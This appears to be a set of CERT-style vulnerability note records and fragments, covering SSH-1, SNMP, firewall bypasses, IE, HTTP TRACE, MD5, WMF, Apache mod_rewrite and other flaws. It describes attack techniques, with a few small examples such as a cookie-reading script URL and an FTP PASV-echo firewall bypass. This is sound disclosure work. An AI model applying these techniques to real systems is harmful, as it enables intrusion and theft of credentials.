    "title": "SSH-1 allows client authentication to be forwarded by a malicious server to another server",
    "body": "SSH-1 authentication relies on the uniqueness of each SSH server's public host key. This key and a corresponding private key are computed by each server for its own use. Since there is a pseudorandom element in the computation of the keys, it is extremely unlikely that two servers would compute the same key pair.Servers share their public keys with other hosts, so a server could steal another server's public host key. However, if a server used another server's public host key as its own, it would also need the corresponding private key to decrypt messages from its clients. The private key is not shared and is very difficult to compute from the public host key alone.In SSH-1, a session ID is computed as a hash of the server's public host key and a 64-bit random number called a cookie. The SSH-1 protocol assumes that:1. no two servers have the same public and private host keys, and 2. that, given any public host key and 64-bit random number, it is very difficult to find a different public host key and/or cookie which yield the same session ID.SSH-1 relies on the above assumptions during authentication. In the SSH-1 authentication process, the server generates a 256-bit random number called a challenge. The challenge is then encrypted with the client's public key, so that only the client can decrypt it. The client receives the encrypted challenge and decrypts it. The client returns the challenge response: an MD5 hash of the concatentation of the challenge and the session ID. The server independently computes the expected challenge response by the same formula. If the client's challenge response matches what the server computed, then the server responds that client has successfully authenticated.Public key encryption of the challenge protects the challenge from discovery by third parties as it is sent from the server to the client. Furthermore, the MD5 hash prevents third parties from discovering the challenge from the client's challenge response to the server. Assuming that neither host has been compromised, only the server and the client will know the challenge.The inclusion of the session ID identifies the challenge response with a certain server, since the session ID is derived from the server's public host key. Different servers should have different host keys, which produce different session ID's and change the expected challenge response. This difference in session ID's prevents a malicious server from replaying a client's challenge response to another server to authenticate as the client.Unfortunately, a weakness has been discovered in the formula for computing a session ID from the server's public key. This discovery allows modification of a server's public host key without changing the derived session ID. Furthermore, the modified key is often much weaker than the original, so it is easily factored to create a corresponding private key. This new key pair can be used to negotiate multiple concurrent SSH connections with same the session ID.Therefore, assumption 2 above, upon which the security of SSH-1 authentication is grounded, does not hold. As a result, authentication in SSH-1 is vulnerable to man-in-the-middle attacks.. overview: A design flaw in the SSH-1 protocol allows a malicious server to establish two concurrent sessions with the same session ID, allowing a man-in-the-middle attack. The client must accept unknown host keys from the malicious server to enable exploitation of this vulnerability.. impact: Attackers can obtain victim user priviledges on other hosts running an SSH-1 server.",

By applying the PROTOS c06-SNMPv1 test suite to a variety of popular SNMPv1-enabled products, the OUSPG revealed a number of vulnerabilities across a wide range of products. This vulnerability note focuses on vulnerabilities occurring in code responsible for SNMPv1 trap handling. SNMPv1 supports five different types of messages: GetRequest, SetRequest, GetNextRequest, GetResponse, and Trap. A single SNMP message is referred to as a Protocol Data Unit (PDU). These messages are described using Abstract Syntax Notation One (ASN.1) and translated into binary format using Basic Encoding Rules (BER). SNMP trap messages are sent from agents to managers. Trap messages are unsolicited (the manager does not issue a request message) and may indicate a warning or error condition or otherwise notify the manager about the agent's state. SNMP managers should reliably decode trap messages and process the resulting application data. OUSPG performed two sets of tests of SNMP trap message handling: one test focused on ASN.1 decoding, the second looked for exceptions in the processing of the decoded data.The results yielded multiple vulnerabilities in both the ASN.1 decoding and the subsequent processing of SNMP trap messages by many different SNMP managers. Vulnerabilities include denial-of-service conditions, format string vulnerabilities, and buffer overflows. Some vulnerabilities do not require the request message to use the correct SNMP community string.Additional Background Information on the OUSPGOUSPG is a academic research group located at Oulu University in Finland. The purpose of this research group is to test software for vulnerabilities. History has shown that the techniques used by the OUSPG have discovered a large number of previously undetected problems in the products and protocols they have tested. In 2001, the OUSPG produced a comprehensive test suite for evaluating implementations of the Lightweight Directory Access Protocol (LDAP). This test suite was developed with the strategy of stressing protocol implementations in unsupported and unexpected ways, and it was very effective in uncovering a wide variety of vulnerabilities across several products. This approach can reveal vulnerabilities that would not manifest themselves under normal operating conditions. After completing its work on LDAP, OUSPG moved its focus to SNMPv1. As with LDAP, they designed a custom test suite, began testing a selection of products, and found a number of vulnerabilities. Because OUSPG's work on LDAP was similar in procedure to its current work on SNMP, you may wish to review the LDAP Test Suite and CERT Advisory CA-2001-18, which outlined results of application of the test suite. In order to test the security of protocols like SNMPv1, the PROTOS project presents a server with a wide variety of sample packets containing unexpected values or illegally formatted data. As a member of the PROTOS project consortium, the OUSPG used the PROTOS c06-snmpv1 test suite to study several implementations of the SNMPv1 protocol.

    "title": "Multiple vendors' SSH transport layer protocol implementations contain vulnerabilities in key exchange and initialization",
    "body": "From the IETF draft SSH Transport Layer Protocol:SSH is a protocol for secure remote login and other secure network services over an insecure network.This document describes the SSH transport layer protocol which typically runs on top of TCP/IP. The protocol can be used as a basis for a number of secure network services. It provides strong encryption, server authentication, and integrity protection. It may also provide compression.Key exchange method, public key algorithm, symmetric encryption algorithm, message authentication algorithm, and hash algorithm are all negotiated.Rapid7 has developed a suite of test cases (SSHredder) that examine the connection initialization, key exchange, and negotiation phase (KEX, KEXINIT) of the SSH transport layer protocol. The suite tests the way an SSH transport layer implementation handles invalid or incorrect packet and string lengths, padding and padding length, malformed strings, and invalid algorithms.The test suite has demonstrated a number of vulnerabilities in different vendors' SSH products. These vulnerabilities include buffer overflows, and they occur before user authentication takes place. Common Vulnerabilities and Exposures (CVE) has assigned the following candidate numbers for several classes of tests performed by SSHredder:CAN-2002-1357: incorrect length fields, i.e. specified length field does not match the actual length of the inputCAN-2002-1358: lists with empty elements or multiple separatorsCAN-2002-1359: \"classic\" buffer overflows (length field, if present, is consistent with the actual length of buffer)CAN-2002-1360: null characters in strings (which trigger conflicts between delimiter-based and length-based strings)Rapid7 has posted an advisory (R7-0009) and the SSHredder test suite.. overview: Secure shell (SSH) transport layer protocol implementations from different vendors contain multiple vulnerabilities in code that handles key exchange and initialization. Both SSH servers and clients are affected. A remote attacker could execute arbitrary code with the privileges of the SSH process or cause a denial of service.. impact: The impact will vary for different vulnerabilities, but in some cases remote attackers could execute arbitrary code with the privileges of the SSH process. Both SSH servers and clients are affected. On Windows systems, SSH servers commonly run with SYSTEM privileges. SSH daemons on UNIX systems typically run with root privileges. In the case of SSH clients, any attacker-supplied code would run with the privileges of the user who started the client program. Additional privileges may be afforded to an attacker when the SSH client is configured to run with an effective user ID (setuid/setgid) of root. Attackers could also crash a vulnerable SSH process, causing a denial of service.While OpenSSH does not appear to be affected, it is worth noting that privilege separation would greatly reduce the impact of arbitrary code execution during the KEXINIT phase.",

    "body": "Many firewalls perform stateful inspection of application layer traffic, allowing them to support passive FTP and other applications that make connections using dynamically chosen ports. In the case of a passive FTP connection to an FTP server located behind a firewall, the firewall examines the application layer of the FTP control channel and interprets FTP commands and responses in order to determine what TCP ports the server is using for data connections. When a client requests a passive FTP connection by issuing the PASV command, the FTP server responds positively with a string like \"227 Entering Passive Mode h1,h2,h3,h4,p1,p2\", instructing the client to initiate a TCP connection to IP address h1,h2,h3,h4 on port p1,p2. The firewall monitors this string and creates a dynamic rule allowing an inbound TCP connection from the client to the server on the specified port.Some firewalls create dynamic rules without assuring that the PASV response string is part of a legitimate FTP connection.An attacker who is able to log in to an FTP server behind a vulnerable firewall issues an FTP command that echoes the argument of the command back to the attacker (NLST is one example of such a command). The attacker includes a PASV response string as the argument to the command, so that the PASV response \"227 Entering Passive Mode h1,h2,h3,h4,p1,p2\" is echoed back through the firewall. Using a spoofed IP address and a separate TCP/IP stack (libnet and libpcap), the attacker sends specially crafted TCP packets that acknowledge (ACK) the echoed response from the FTP server up to the start of the PASV response. If the operating system used by the FTP server supports the partial acknowledgement of TCP data segments (RFC 2581), it will resend the unacknowledged data, starting with the beginning of the PASV response. A vulnerable firewall will see a properly terminated PASV response at the start of a packet and create a rule allowing the client to connect to the specified port on the FTP server.This behavior has been previously discussed in public forums (February 2000):http://online.securityfocus.com/archive/1/47688/2000-02-12/2000-02-18/1http://online.securityfocus.com/archive/82/45571/2000-02-08/2000-02-14/1http://online.securityfocus.com/archive/82/45758/2000-02-08/2000-02-14/1In the February 2000 discussion, a number of similar techniques are mentioned:using a URL with a properly padded FTP command (HTML email or web page with hostile URL sent to clients)using other FTP commands (STAT) to echo PORT commands or PASV responses back through the firewallusing TCP MSS to control/lower the size of a TCP packet and properly align FTP commands and responsesuploading a file or creating a directory with a crafted name that contains FTP commands, then using \"ls\" or similar to echo the command back through the firewallThese techniques, including the use of partial acknowledgement as described above, might also be used with the PORT command by a malicious FTP server to open connections to active FTP clients that are behind a vulnerable firewall.It is possible that similar vulnerabilities exist in the way firewalls handle other applications that use dynamic ports.

    "body": "Background on TCP/IP Connection SemanticsTo establish a TCP connection, a client and server must participate in a three-way handshake (as outlined in RFC793 - \"Transmission Control Protocol\"):1. The client system sends a packet with the SYN flag set to the server.2. The server acknowledges the client by sending a packet back with the SYN and ACK flags set.3. The client completes the connection by sending a packet with the ACK flag set.The connection between the client and the server is then open, and the service-specific data can be exchanged between the client and the server. The following diagram depicts the connection setup sequence:A firewall inserted between a client and a server can be used to manage the connection setup and subsequent traffic flow between the two systems. In general, firewalls are of two types: packet-filtering firewalls, and application-level firewalls. Packet filters look at the source, destination, types, and options associated with the packet, while an application level firewall can \"look inside\" the packet to examine application-specific attributes. This document is concerned primarily with packet-filtering firewalls. Section 3.4 (Establishing a connection) of RFC793 describes the three-way handshake as the standard procedure used to establish a connection. Firewalls will typically not allow this process between hosts that are not permitted to communicate with each other. For example, if an attacker sends a packet with the SYN bit set to a victim server, the firewall will not relay this packet to the victim because the firewall's rules only allow packets with the SYN bit set to come from certain hosts. As a result, the three-way handshake will not be completed, and the attacker will not be able to establish a connection with a host behind the firewall. This method of filtering SYN packets is typically the method used by packet-filtering firewalls to prevent certain hosts from \"getting past the firewall.\" How the Attacker Can Bypass the FirewallAn attacker is free to set whatever flags he chooses to set on any packet. RFC793 defines the meaning of most flag combinations, but it does not address all scenarios in which odd or unexpected flag combinations may be encountered. The method for handling the packet is largely left up to the TCP implementer, and each implementation handles flag combinations differently. For example, T/TCP (RFC1644) recognizes a packet with both the SYN and FIN flags set as being valid. Some implementations are even more liberal in what they accept and choose to treat any packet with the SYN flag set (regardless of what other flags are set or unset) as the opening in the three-way handshake. Other implementations are more conservative and drop packets with unexpected combinations of flags.This ambiguity results in a vulnerability in certain situations. Suppose you have a firewall that passes packets if the RST flag is set, regardless of the state of the SYN flag. Furthermore, suppose you have a host that accepts a SYN flag as the opening of the three-way handshake even if the RST flag is set. An intruder can now send a packet with the SYN and RST flags set and establish a connection with the host behind the firewall in violation of the expected behavior.A change introduced in the Linux Kernel (version 2.4.20) ensures that at least packets with both the SYN and RST flags set are discarded. This change was made within the function tcp_input.c.Finally, research has indicated that multiple TCP implementations will allow a TCP session to be established with hosts by setting certain combinations of flags in an initial packet. The researchers go on to indicate that, \"Other OSes than those tested above are expected to behave in a similar manner after obtaining such a discouraging result...\"Note that while the \"detailed\" research implies it is incorrect for a TCP implementation to accept a SYN with certain other bits set, it is actually a perfectly legal but rarely implemented behavior.

    "body": "IE uses a cross-domain security model to maintain separation between browser frames from different sources. This model is designed to prevent code in one domain from accessing data in a different domain. From Microsoft Security Bulletin MS04-004:One of the principal security functions of a browser is to ensure that browser windows that are under the control of different Web sites cannot interfere with each other or access each other's data, while allowing windows from the same site to interact with each other. To differentiate between cooperative and uncooperative browser windows, the concept of a \"domain\" has been created. A domain is a security boundary - any open windows within the same domain can interact with each other, but windows from different domains cannot. The cross-domain security model is the part of the security architecture that keeps windows from different domains from interfering with each other.IE can evaluate script contained in a URL. For example, either of the following URLs will display an alert dialog containing the text \"Hello world.\":javascript:eval('alert(\"Hello world.\")')javascript:alert(\"Hello world.\")This URL will display an alert dialog with the contents of the HTTP cookie for the current site:javascript:alert(document.cookie)The cross-domain security model should not allow script from one domain to read or modify data in a different domain using this type of \"script URL\".IE hosts an instance of the WebBrowser ActiveX control, which includes technology called the \"Travel Log.\" From MS04-004:Internet Explorer's travel log is an interface that maintains a navigation stack for the WebBrowser control. This stack is used by Internet Explorer to maintain a list of recently visited sites. For example, the History tab in Internet Explorer is built based on information from the travel log.The IE cross-domain security model does not properly validate the source domain of the URLs stored on the travel log stack. Script in a URL stored in the travel log can be executed in the context of a different domain, including the Local Machine Zone.The MS03-048 patch prevents script URLs from being directly stored in the travel log. It still possible, however, to use other techniques, such as frames (BackToFramedJpu) or certain DHTML methods (Andreas Sandblad #12), to store script URLs in the travel log. These two attack vectors are blocked by the MS04-004 patch.An attacker could exploit this vulnerability using a crafted HTML document containing script. Due to the way IE determines the MIME type of a file referenced by a URL, an HTML document may not necessarily have the expected file name extension (.html or .htm).Any program that uses the WebBrowser ActiveX control or the IE HTML rendering engine (MSHTML) may be affected by this vulnerability.

It is a user level daemon that works in concert with the IP-Dialup driver (ipdcm) and PPP streams module ( ppp(7M)) to provide IP network services over an analog modem using dialed voice grade telephone lines. The link manager automates the process of connecting to a peer (remote) host when PPP service with that host is required.

    "body": "Microsoft IIS servers support the HTTP TRACK method. The HTTP TRACK method asks a web server to echo the contents of the request back to the client for debugging purposes. The TRACK request is not RFC compliant and not well documented.The complete request, including HTTP headers, is returned in the entity-body of a TRACK response. This leads to a Cross-site Scripting attack. Using features that provide client-side HTTP protocol support, such as XMLHTTP ActiveX or XMLDOM scripting objects, a web site can cause browsers to issue TRACK requests. The site can read the TRACK response, including sensitive header information such as cookies or authentication data. Because the TRACK method is similar to the TRACE method, when combined with cross-domain browser vulnerabilities (VU#244729, VU#711843, VU#728563), HTTP TRACK and client-side HTTP support can be leveraged by attackers to read sensitive header information from third-party domains. This technique has been termed \"Cross-Site Tracing,\" or XST, in a report published by WhiteHat Security. As noted in the report, the technique can be used to bypass the HttpOnly cookie attribute introduced in Microsoft Internet Explorer 6.0 SP1.

The HTTP TRACE method is described in the HTTP 1.1 standard (RFC 2616, section 9.8):9.8 TRACE The TRACE method is used to invoke a remote, application-layer loop- back of the request message. The final recipient of the request SHOULD reflect the message received back to the client as the entity-body of a 200 (OK) response. ... If the request is valid, the response SHOULD contain the entire request message in the entity-body, with a Content-Type of \"message/http\". Responses to this method MUST NOT be cached.As defined above, the complete request, including HTTP headers, is returned in the entity-body of a TRACE response. Using features that provide client-side HTTP protocol support, such as XMLHTTP ActiveX or XMLDOM scripting objects, a web site can cause browsers to issue TRACE requests. The site can read the TRACE response, including sensitive header information such as cookies or authentication data.When combined with cross-domain browser vulnerabilities (VU#244729, VU#711843, VU#728563), HTTP TRACE and client-side HTTP support can be leveraged by attackers to read sensitive header information from third-party domains. This technique has been termed \"Cross-Site Tracing,\" or XST, in a report published by WhiteHat Security. As noted in the report, the technique can be used to bypass the HttpOnly cookie attribute introduced in Microsoft Internet Explorer 6.0 SP1. HttpOnly blocks script access to the cookie property (document.cookie), but does not prevent a scripting object from reading the cookie out of an HTTP TRACE response.. overview: The HTTP TRACE method returns the contents of client HTTP requests in the entity-body of the TRACE response. Attackers could leverage this behavior to access sensitive information, such as cookies or authentication data, contained in the HTTP headers of the request.. impact: Attackers may abuse HTTP TRACE functionality to gain access to information in HTTP headers such as cookies and authentication data.

    "body": "A secure cryptographic hash algorithm is one that generates a unique identifier of a fixed size (known as a \"digest\" or simply \"hash\") for a block of data of arbitrary size. The MD5 algorithm is a standard, widely used example of such an algorithm and is defined in IETF RFC 1321. One of the requirements of secure cryptographic hash algorithms is that it be extremely unlikely for two different inputs to the algorithm to generate the same digest. This property is generally referred to as collision resistance and cases where an algorithm generates the same digest for two different blocks of data are known as collisions.Cryptanalytic research published in 1996 described a weakness in the MD5 algorithm that could result in collision attacks, at least in principle. Further research published in 2004 demonstrated the practical ability for an attacker to generate collisions and in 2005 the ability for an attacker to generate colliding x.509 certificates was demonstrated. In 2008, researchers demonstrated the practical vulnerability of Public Key Infrastructures (PKI) to such attacks, including the construction of an SSL certificate that allows an attacker to impersonate a trusted root Certificate Authority (CA). Most operating systems bundle a collection of trusted CA certificates, including some that use the MD5 signing algorithm, providing obvious targets for attackers to spoof.. overview: Weaknesses in the MD5 algorithm allow for collisions in output. As a result, attackers can generate cryptographic tokens or other data that illegitimately appear to be authentic.. impact: An attacker can construct forged data in a variety of forms that will cause software using the MD5 algorithm to incorrectly identify it as trustworthy. Because the underlying vulnerability occurs in a cryptographic primitive, specific exploitation scenarios vary widely depending on the nature of the data the attacker has the ability to spoof and how it is validated by software. In a particularly egregious vulnerability scenario, a victim user may be mislead into supplying sensitive information to a malicious website believing that it is authentic based on an apparently valid signed SSL certificate.",

For example, a print job can be cancelled via a GDI Escape call.Windows Metafile (WMF)Microsoft Windows Metafile (WMF) format images are graphical files that can contain both vector and bitmap-based picture information. WMF files contain a sequence of GDI function calls. The image is created by executing the GDI functions.The problemCertain GDI functions can have unexpected security implications. According to the MSDN document Security Considerations: GDI:Bitmaps, metafiles, and fonts are complex structures that could become corrupted. It is good practice to try to ensure that these items are uncorrupted and from a trustworthy source.Current public exploits use the SETABORTPROC GDI Escape function to execute arbitrary code when viewed. The SETABORTPROC GDI Escape is obsolete, and is provided only for compatibility with 16-bit versions of Windows. Other GDI functions, in particular the GDI Escape functions, may also have similar vulnerabilities.The public exploits currently use the Windows Picture and Fax Viewer (SHIMGVW.DLL) as an attack vector. However, please note that disabling the Windows Picture and Fax Viewer will not eliminate this vulnerability. Limited testing has shown that any application that makes the SetWinMetaFileBits GDI function call may be used to trigger the SETABORTPROC GDI Escape on Windows NT, Windows 2000, Windows XP, and Windows Server 2003. The GDI implementation of Windows 98 and Windows Me appears to be different in that the PlayMetaFile GDI function seems to trigger the SETABORTPROC GDI Escape.Any application that can open a file with the associated program for that file type, such as one that uses ShellExecute, can be used as an attack vector. Most email clients can be used as an attack vector for this vulnerability in this way. Windows Picture and Fax Viewer is the application that is associated with WMF and other graphic files by default on Windows XP and Windows Server 2003.Internet Explorer is a common attack vector for this vulnerability because, in its default configuration, it can automatically launch the Windows Picture and Fax Viewer as the result of viewing a web page. Google Desktop Search (GDS) can also trigger the vulnerability if a malicious WMF file is placed in a location that is indexed. Other content indexing software may also be vulnerable.The following diagram illustrates several attack vectors for this vulnerability:. overview: Microsoft Windows is vulnerable to remote code execution via an error in handling files using the Windows Metafile image format. Exploit code has been publicly posted and used to successfully attack fully-patched Windows XP SP2 systems.

    "body": "Microsoft Windows provides numerous, fine grained permissions and privileges to control access to Windows components, such as services, files, and registry entries. Recent research has uncovered insecure configurations within user accounts and groups on Microsoft Windows systems. These configurations may allow local attackers to gain access to, and manipulate system resources. The researchers have developed a model that analyzes permissions to expose privilege escalation vulnerabilities. The research focused on three particular components of the Windows architecture:ServicesWindows services may be installed and configured with unnecessary privileges. This may allow a lesser privileged user to access and change the settings for a service that runs with greater privileges. Of particular concern are the following privileges: The SERVICE_CHANGE_CONFIG access right allows a user to change the a service's configuration. This includes the executable that services launches and the user account with which a service runs as. According to Microsoft, \"Because this grants the caller the right to change the executable file that the system runs, it should be granted only to administrators.\" The SERVICE_ALL_ACCESS access right allows a user full control over a service. Files and DirectoriesAny privileges that allow the contents of a file or a directory to be modified should be granted to only trusted users. The following access rights a of particular concern:The FILE_ALL_ACCESS access right allows a user to completely control a file, including read, write and execute privileges.The FILE_APPEND_DATA access right allows a user to add data to a file.The FILE_WRITE_DATA access right allows a user to write and rewrite data to a file.Registry KeysUsers with KEY_SET_VALUE permissions can modify registry keys that specify executables, DLLs, and/or Globally Unique Identifiers (GUIDs).The WRITE_DAC access right provides the ability to modify the access control list for a resource. Users granted this right have the ability to change the way they, or other users, access a resource. This may allow attackers to grant themselves, or others arbitrary permissions over a resource.Note that these issues can affect all software that is developed for the Microsoft Windows platform. Known Windows services that have weak permissions include, but may not belimited toMicrosoft SSDP Discovery service (SSDPSRV)NetBios over TCP/IP service (NetBT) Smart Card service (SCardSvr)Universal Plug and Play Device Host service (upnphost)DNS Client service (Dnscache)DHCP Client service (Dhcp). overview: Microsoft Windows access controls may be improperly configured potentially allowing a local attacker to gain elevated privileges on a vulnerable system.. impact: A local user with valid login credentials may be able gain elevated privileges on a vulnerable Windows system.We are aware of publicly available exploit code that claims to be a tool to identify vulnerable services.

One of these modules, mod_rewrite, provides a rule-based rewriting engine to rewrite requested URLs \"on the fly\" based on regular expressions.An off-by-one error exists in the ldap scheme handling in mod_rewrite. For some RewriteRules, specifically those where the remote user can influence the beginning of a rewritten URL and that do not include any of the following flags: Forbidden (F), Gone (G), or NoEscape (NE), this could lead to a pointer being written out of bounds. This flaw causes a remotely exploitable vulnerability on web servers that have mod_rewrite enabled (configuration directive \"RewriteEngine on\") and configured to use certain rules. For example, rules with this format expose the vulnerability:RewriteRule fred/(.*) $1While rules with this format do not expose the vulnerability:RewriteRule fred/(.*) joe/$1The versions of the mod_rewrite module supplied with the Apache HTTP server versions1.3 branch from 1.3.282.0 branch from 2.0.462.2 branch from 2.2.0are vulnerable to this issue but earlier versions are not. The Apache Software Foundation notes that mod_rewrite is not enabled and configured as a normal default, however it is a commonly used module and may be provided in a vulnerable configuration by redistributors.. overview: A vulnerability in a common Apache HTTP server module, mod_rewrite, could allow a remote attacker to execute arbitrary code on an affected web server.. impact: An attacker may be able to execute arbitrary code in the context of the web server user (e.g., \"apache\", \"httpd\", \"nobody\", \"SYSTEM\", etc.).

    "body": "On Microsoft Windows systems, Mozilla Firefox installs protocol handlers for Mozilla-specific protocols, such as the FirefoxURL and FirefoxHTML protocols. If Microsoft Windows encounters a URL protocol it cannot handle natively it searches the Windows registry for the appropriate protocol handler. When the correct protocol handler is found, Windows passes it the URL string. By design Windows passes the URL string to the protocol handler as it was received without performing any sanitization.Mozilla Firefox URL protocol handlers are constructed in a way that may allow a remote attacker to execute arbitrary JavaScript with elevated (chrome) privileges. Mozilla Firefox security restrictions detect and prevent the execution of such JavaScript. However, if a remote attacker can persuade a user with Firefox installed to access a specially crafted web page using Internet Explorer, and perhaps other Windows applications, the malicious JavaScript will be executed. Reports claim this vulnerability is introduced when Firefox versions 2.0.0.2 and later are installed.Exploit code is publicly available for this vulnerability.. overview: Mozilla Firefox protocol handlers may allow remotely supplied JavaScript to execute with elevated privileges. This may allow a remote, unauthenticated attacker to execute arbitrary code on a vulnerable system.. impact: This vulnerability may allow a remote, unauthenticated attacker to execute JavaScript with elevated (chrome) privileges.

Data forks are used to store unstructured data.The AppleDouble standard is specified in RFC 1740:AppleDouble is the preferred format for a Macintosh file that is to be included in an Internet mail message, because it provides recipients with Macintosh computers the entire document, including icons and other Macintosh specific information, while other users easily can extract the Data fork (the actual data) as it is separated from the AppleDouble encoding.Apple Mail parses resource forks in mail attachments that use the MIME format AppleDouble.From the Heise Security report:Files on a Mac can contain additional information, such as the one that another program should be used to open them. The operating system stores these in the file system in a so-called \"resource fork\", which is linked to the file. This type of information is usually limited to the local system; however, for emails the MIME format AppleDouble allows resource forks to be attached -- these are automatically analyzed by Apple Mail.This allows an attacker to create an email with an attachment called picture.jpg that is displayed with a JPEG icon. But when the user tries to open the picture, Apple Mail analyses the resource fork and executes a shell script, for example, without further warning. In this case, even the MIME type displays the attachment as image/jpeg, but careful Mac users may become suspicious when they see that the picture is not immediately displayed as usual.Note that to successfully exploit this vulnerability an attacker would need to convince a user to open a specially crafted email attachment with Apple Mail.

    "body": "AutoRun, which was introduced with Windows 95, is a feature that causes Windows to automatically take an action when a removable media device is inserted. For example, when an AutoRun-enabled CD-ROM is inserted, Windows may automatically execute a program on that disc. This also holds true for U3-enabled USB devices, which emulate a CD-ROM device as well as provide USB mass storage capabilities. These devices can automatically execute code when they are inserted into a Windows system. The AutoRun action can also take place when the user clicks the icon for an AutoRun-enabled device. AutoRun is enabled by default in Windows. AutoPlay, which was introduced with Windows XP, extends AutoRun capabilities to also allow a menu to be presented to the user, which lists actions that the user may take. AutoRun and AutoPlay can be disabled by setting the CDRom Autorun registry value to 0 and also setting the NoDriveTypeAutoRun registry value to 0xFF. The NoDriveTypeAutoRun registry value is directly tied to the Group Policy setting for \"Turn off Autoplay.\"Microsoft Windows fails to properly handle the NoDriveTypeAutoRun registry value. According to Microsoft's documentation, setting NoDriveTypeAutoRun to 0xFF should disable AutoPlay for all types of drives. However, when this registry value is present, Vista enables some AutoPlay features that may not have been enabled prior to setting that registry value. For example, if NoDriveTypeAutoRun is set to 0xFF, Vista may execute a program specified in the Autorun.inf file when the device icon is clicked. Other values for NoDriveTypeAutoRun may also enable certain AutoPlay features in Vista.

    "body": "In the C language, given the following types: char *buf; int len;some C compilers will assume that buf+len >= buf. As a result, code that performs wrapping checks similar to the following:len = 1<<30;[...]if(buf+len < buf) /* wrap check */ [...overflow occurred...]are optimized out by these compilers; no object code to perform the check will appear in the resulting executable program. In the case where the wrap test expression is optimized out, a subsequent manipulation of len could cause an overflow. As a result, applications that perform such checks may be vulnerable to buffer overflows.Wrapping checks that use methods similar to the one described above depend on undefined behavior. Conforming implementations are permitted to perform the optimization by the ISO/IEC 9899:1999 C specification (§6.5.6p8) as undefined behavior. Even if a conforming implementation currently generates object code for an undefined behavior, future versions of the compiler are not obligated to do the same; this behavior may be viewed as an opportunity for further optimization. To ensure that such changes to the compiler do not invalidate assumptions, developers should follow the recommendations described in CERT C Secure Coding recommendation MSC15-C and rule ARR38-C to avoid this error. Furthermore, compilers are not required to issue diagnostics for undefined behavior, so there is frequently no easy way to identify undefined behavior in code, particularly during manual code audits. Note that this issue does not strictly constitute a vulnerability in the compilers themselves. Rather, this behavior may introduce vulnerabilities in applications that include similar code and are compiled with affected compiler implementations. Existing code that relies on the undefined behavior in the wrapping check is particularly susceptible to this behavior.Multiple implementations are known to perform this optimization. This optimization may be affected by the setting of the optimization level as well as other flags. Additional information about affected implementations can be found in the Systems Affected section of this document.. overview: Some C compilers optimize away pointer arithmetic overflow tests that depend on undefined behavior without providing a diagnostic (a warning). Applications containing these tests may be vulnerable to buffer overflows if compiled with these compilers.. impact: An application that performs wrapping checks based on an expression such as the one described above may be vulnerable to buffer overflow if compiled with affected compiler implementations. The nature of the resulting vulnerability would be specific to the application and depends on how the affected code is used.",

If this value is set to \"allowed\" for the associated URL Security Zone, Safari will automatically execute files, which are also automatically downloaded from the website.For the Trusted Sites and Local Intranet zones on Internet Explorer 6 systems, this value defaults to 0x00, which indicates that the action is \"allowed.\" This URL Security Zone setting appears to have no representation in the GUI for configuring the zones on Internet Explorer 6 systems. This means that no matter how the Trusted Sites or Local Intranet zones are configured using the graphical interface for Internet Explorer, Safari will automatically execute files that are downloaded from sites that reside in these zones.Internet Explorer 7 systems expose the URLACTION_SHELL_EXECUTE_HIGHRISK URL Security Zone setting as \"Launching applications and unsafe files\" in the Internet Explorer zone security configuration dialog. This value defaults to 0x01 for the Trusted Sites zone, and 0x00 for the Local Intranet zone, which correlate to \"prompt\" and \"allow,\" respectively. This means that by default, any site in the Local Intranet zone on Internet Explorer 7 systems can cause Safari to automatically execute downloaded files. Safari will automatically execute downloaded files in other zones if the \"Launching applications and unsafe files\" option is set to \"allow.\". overview: Apple Safari automatically executes downloaded files based on Internet Explorer zone settings, which can allow a remote attacker to execute arbitrary code on a vulnerable system.. impact: By convincing a user to visit a specially crafted web page with Apple Safari on Windows, an attacker may be able to execute arbitrary code on a vulnerable system.",

Loosely, the record partitions all hosts into permitted and not-permitted sets (though some hosts might fall into neither category).libspf2 contins a buffer overflow in DNS TXT record parsing. According to Doxpara Research:DNS TXT records have long been a little tricky to parse, due to them containing two length fields. First, there is the length field of the record as a whole. Then, there is a sublength field, from 0 to 255, that describes the length of a particular character string inside the larger record. There is nothing that links the two values, and DNS servers to not themselves enforce sanity checks here. As such, there is always a risk that when receiving a DNS TXT record, the outer record length will be the amount allocated, but the inner length will be copied.This issue is similar to VU#814627 \"Sendmail vulnerable to buffer overflow when DNS map is specified using TXT records.\". overview: libspf2 contains a buffer overflow vulnerability in code that parses DNS TXT records.. impact: This vulnerability could allow an unauthenticated, remote attacker to execute arbitrary code on a system running libspf2.",

Neighbor solicitation (type 135) messages are used by NDP to discover and determine the reachability of nearby IPv6 nodes. Nodes that can send each other NDP messages are considered to be on-link (as per RFC 4861).After receiving a neighbor solicitation request from a system that is on-link and is using a spoofed IPv6 address as the source address, a router will create a neighbor cache entry. When this entry is made, some IPv6 implementations will create a Forwarding Information Base (FIB) entry. This FIB entry may cause the router to incorrectly forward traffic to the device that sent original spoofed neighbor solicitation request. Note that an attacker must have IPv6 connectivity to the same router as their target for this vulnerability to be exploited. Although this vulnerability has only a local attack vector (NDP messages are not forwarded by routers), flat IPv6 networks can include many hosts and may cover large geographical distances as compared to IPv4 networks.Similar problems to this issue have been discussed in RFC 3756 \"IPv6 Neighbor Discovery (ND) Trust Models and Threats.\". overview: A vulnerability in some implementations of the IPv6 Neighbor Discovery Protocol may allow a nearby attacker to intercept traffic or cause congested links to become overloaded.. impact: An attacker may be able to intercept private network traffic.

The resulting Flash content is typically published in the form of SWF files embedded in web pages. ActionScript within a Flash file creates dynamic content on the web and interacts with web browsers in a manner similar to JavaScript, VBScript, and other client-side scripting languages. As with traditional script content in HTML pages, improperly validated user-controlled input in Flash files can execute arbitrary ActionScript and JavaScript in the context of the domain hosting the affected Flash file. One specific type of vulnerability depends on the behavior of a special ActionScript protocol called asfunction. The asfunction protocol is used for URLs in HTML text fields and causes a link to invoke an ActionScript function in a Flash file instead of opening a URL. An attacker could call all public and static functions by supplying a string parameter to asfunction. There exist other types of vulnerabilities as well.Applications that generate Flash files (e.g., \"save as SWF\", \"export to SWF\", etc.) by using vulnerable templates or by including static Flash content like a controller may automatically insert generic and vulnerable ActionScript into saved files.

    "title": "Clientless SSL VPN products break web browser domain-based security models",
